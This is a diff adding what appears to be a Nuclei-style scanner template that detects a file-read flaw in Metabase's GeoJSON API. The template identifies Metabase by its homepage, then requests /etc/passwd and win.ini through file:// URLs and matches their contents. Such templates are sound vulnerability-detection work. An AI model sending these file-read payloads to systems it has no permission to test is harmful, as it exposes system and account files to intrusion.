@@ -1,0 +1,36 @@
+id: poc-yaml-metabase-any-fileread
+info:
+  name: Metabase GeoJSON Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "metabase"
+  - method: GET
+    path:
+      - "/api/geojson?url=file:///etc/passwd"
+      - "/api/geojson?url=file:///c://windows/win.ini"
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
